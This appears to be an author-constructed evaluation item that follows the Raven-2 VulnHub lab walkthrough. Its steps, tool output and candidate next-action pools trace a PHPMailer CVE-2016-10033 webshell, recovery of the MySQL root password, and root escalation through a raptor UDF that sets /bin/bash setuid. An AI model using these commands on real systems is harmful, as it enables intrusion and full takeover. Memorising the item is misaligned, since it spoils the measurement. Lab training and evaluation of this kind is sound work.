source: Representative walkthrough constructed from public Raven-2 write-up structure (PHPMailer CVE-2016-10033 RCE via contact form -> www-data webshell -> MySQL UDF root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.
vulnhub_correspondence: WordPress site bundles vulnerable PHPMailer 5.2.16 under /vendor; contact.php Return-Path injection (CVE-2016-10033) drops a webshell as www-data; MySQL runs as root and the raptor UDF library escalates to root.

steps.actor_intent: Scan the target with nmap to enumerate open services and versions.
steps.tool_output:
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind
3306/tcp open  mysql   MySQL 5.5.60
http://10.10.10.5/ [200 OK] Apache[2.4.10], PHP[5.6.40], MetaGenerator[WordPress 4.8.7], PoweredBy[WordPress], WordPress[4.8.7]

steps.actor_intent: Enumerate web directories to find the application and bundled components.
Read the bundled PHPMailer version file to confirm it is vulnerable to CVE-2016-10033.
Exploit the PHPMailer Return-Path injection through contact.php to drop a webshell.
steps.tool_output:
[*] Target PHPMailer 5.2.16 is vulnerable to CVE-2016-10033
[+] injecting payload into Return-Path
[+] backdoor written to /backdoor.php
command execution confirmed

steps.actor_intent: Run id through the backdoor to confirm execution as the web user.
candidate_pool: Run id through the backdoor to confirm execution as the web user.
Re-run the PHPMailer exploit that already succeeded.
Enumerate web directories again for more paths.
Immediately read the root flag with no root access.

steps.actor_intent: Read the second flag found in the web root.
Read the WordPress config to recover the MySQL root password.
Confirm MySQL is running as root so its UDF can be abused for escalation.
Escalate to root by loading a malicious MySQL UDF (raptor) that runs do_system.
steps.tool_command: mysql -u root -p'R@v3nSecurity' < raptor_udf.sql; then trigger do_system
steps.tool_output:
mysql> select do_system('chmod +s /bin/bash');
# /bin/bash -p
# id
uid=0(root) gid=0(root)
root
candidate_pool: Escalate to root by loading a malicious MySQL UDF that runs do_system.
Read the root flag before having root.
